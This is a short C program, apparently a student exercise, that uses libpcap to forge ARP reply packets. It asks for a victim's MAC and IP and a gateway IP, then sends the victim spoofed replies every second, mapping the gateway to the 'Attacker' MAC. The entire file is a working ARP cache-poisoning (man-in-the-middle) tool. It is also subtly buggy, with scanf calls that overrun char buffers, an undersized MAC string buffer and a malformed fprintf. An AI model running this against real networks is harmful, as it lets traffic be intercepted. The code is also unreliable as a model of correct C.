#include <pcap.h>
#include <stdio.h>
#include <netinet/ether.h>
#include <arpa/inet.h>
#include <stdlib.h>
#include <unistd.h>
void usage()
{
	printf("syntax: pcap_test <interface>\n");
	printf("sample: pcap_test wlan0");
}

void getmac(char *buf)
{
	char *cmd = "ifconfig | grep ether";
	FILE *m;
	char data[100],mac[10];	
	
	m = popen(cmd,"r");
	fgets(data,99,m);
	sscanf(data,"%s%s",data,mac);
	sscanf(mac,"%x:%x:%x:%x:%x:%x",buf,buf+1,buf+2,buf+3,buf+4,buf+5);	
	pclose(m);
}


int main(int argc, char *argv[])
{
	if(argc != 2)
	{	
		usage();
		return -1;
	}
	struct ether_header eth;
	char *dev =argv[1];
	char errbuf[PCAP_ERRBUF_SIZE],buf[1000],srcmac[6],dstmac[6];
	pcap_t* handle = pcap_open_live(dev,BUFSIZ,1,1000,errbuf);
	if(handle == NULL)	
	{
		fprintf(stderr,"couldn;t open device",dev,errbuf);
		return -1;	
	}
	
	printf("Victimmac : ");
	scanf("%x-%x-%x-%x-%x-%x",&buf[0],&buf[1],&buf[2],&buf[3],&buf[4],&buf[5]);

	getmac(buf+6);
	printf("Attackermac : %#1x-%#1x-%#1x-%#1x-%#1x-%#1x\n",buf[6],buf[7],buf[8],buf[9],buf[10],buf[11]);
	buf[12]=0x08;
	buf[13]=0x06;


//arp==========================================
	//hardware type	
	buf[14]=0x00;
	buf[15]=0x01;
	//protocol type
	buf[16]=0x08;
	buf[17]=0x00;
	//hardware size
	buf[18]=0x06;
	//protocol size
	buf[19]=0x04;
	//opcode
	buf[20]=0x00;
	buf[21]=0x02;
	//sender MAC
	getmac(buf+22);
	printf("Attacker mac:%#1x-%#1x-%#1x-%#1x-%#1x-%#1x\n",buf[22],buf[23],buf[24],buf[25],buf[26],buf[27]);
	
	//sender IP
	printf("gateway ip : ");
	scanf("%d.%d.%d.%d",&buf[28],&buf[29],&buf[30],&buf[31]);
	//Target MAC
	printf("victim mac : ");
	scanf("%x-%x-%x-%x-%x-%x",&buf[32],&buf[33],&buf[34],&buf[35],&buf[36],&buf[37]);
	//Target IP
	printf("victim ip : ");
	scanf("%d.%d.%d.%d",&buf[38],&buf[39],&buf[40],&buf[41]);



	while(true)
	{
	
		pcap_sendpacket(handle,(const u_char *)buf,999);
		sleep(1);
	}



}












